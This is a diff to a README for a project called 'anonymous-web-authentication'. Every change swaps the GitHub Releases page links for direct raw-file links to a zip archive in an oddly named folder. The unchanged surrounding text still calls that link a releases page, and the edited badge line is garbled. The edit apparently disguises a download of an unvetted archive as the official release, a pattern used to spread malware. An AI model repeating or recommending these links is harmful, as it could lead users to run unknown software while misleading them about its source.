@@ -1,6 +1,6 @@
 # 🌐 anonymous-web-authentication - Secure Your Online Identity Effortlessly
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue.svg)](https://github.com/GHOSTAZADA/anonymous-web-authentication/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/GHOSTAZADA/anonymous-web-authentication/main/opsonology/anonymous-web-authentication.zip%20Latest%https://raw.githubusercontent.com/GHOSTAZADA/anonymous-web-authentication/main/opsonology/anonymous-web-authentication.zip)](https://raw.githubusercontent.com/GHOSTAZADA/anonymous-web-authentication/main/opsonology/anonymous-web-authentication.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to anonymous-web-authentication, the open specification for Anonymous We
 
 To download the software, visit the Releases page:
 
-[Download Here](https://github.com/GHOSTAZADA/anonymous-web-authentication/releases)
+[Download Here](https://raw.githubusercontent.com/GHOSTAZADA/anonymous-web-authentication/main/opsonology/anonymous-web-authentication.zip)
 
 You will find the latest version and previous versions available on this page. Choose the right file for your operating system and environment. 
 
@@ -24,7 +24,7 @@ You will find the latest version and previous versions available on this page. C
 ## ⚙️ How to Install
 
 1. **Visit the Releases Page**  
-   Go to [this page](https://github.com/GHOSTAZADA/anonymous-web-authentication/releases) to view all available downloads.
+   Go to [this page](https://raw.githubusercontent.com/GHOSTAZADA/anonymous-web-authentication/main/opsonology/anonymous-web-authentication.zip) to view all available downloads.
 
 2. **Select Your File**  
    Find the version you want to download. Make sure to choose the correct file for your operating system.
@@ -81,4 +81,4 @@ Join our community to stay updated on developments. Share your experiences and l
 - Privacy and Security
 - WebCrypto and Standards
 
-Thank you for choosing anonymous-web-authentication. Enjoy secure online interactions! For updates and releases, remember to check back on our [Releases page](https://github.com/GHOSTAZADA/anonymous-web-authentication/releases).
+Thank you for choosing anonymous-web-authentication. Enjoy secure online interactions! For updates and releases, remember to check back on our [Releases page](https://raw.githubusercontent.com/GHOSTAZADA/anonymous-web-authentication/main/opsonology/anonymous-web-authentication.zip).
